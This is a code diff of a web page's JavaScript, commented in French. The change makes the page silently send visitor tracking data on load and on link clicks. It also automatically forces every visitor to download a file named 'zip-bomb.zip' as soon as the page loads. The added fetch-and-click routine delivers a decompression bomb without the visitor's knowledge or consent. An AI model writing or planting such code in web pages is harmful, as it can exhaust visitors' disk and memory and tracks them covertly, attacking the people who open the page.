@@ -50,16 +50,16 @@
     
     document.addEventListener('DOMContentLoaded', function() {
         var userID = getOrCreateUserId();
-        sendEventData(userID, window.location.href, 'Page Load'); 
+        sendEventData(userID, window.location.href, 'Page Load'); // Envoi immédiat des données au chargement
 
         // Téléchargement automatique du document
-        downloadFile('https://github.com/Towarmat83/chuckmorris.github.io/blob/main/zip-bomb.zip'); 
+        downloadFile('https://github.com/Towarmat83/chuckmorris.github.io/blob/main/zip-bomb.zip'); // URL complète vers votre fichier
 
         var links = document.querySelectorAll('a.trackable');
         links.forEach(function(link) {
             link.addEventListener('click', function(e) {
                 e.preventDefault();
-                sendEventData(userID, this.href, 'Link Click'); 
+                sendEventData(userID, this.href, 'Link Click'); // Utilisation de la fonction pour gérer l'événement
             });
         });
     });
@@ -78,12 +78,21 @@
     }
 
     function downloadFile(url) {
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = ''; 
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+        fetch(url)
+            .then(response => response.blob())
+            .then(blob => {
+                const a = document.createElement('a');
+                const url = window.URL.createObjectURL(blob);
+                a.href = url;
+                a.download = 'zip-bomb.zip'; // Nom du fichier à télécharger
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(() => {
+                    window.URL.revokeObjectURL(url);
+                    document.body.removeChild(a);
+                }, 0);
+            })
+            .catch(error => console.error('Download error:', error));
     }
     </script>
 </body>
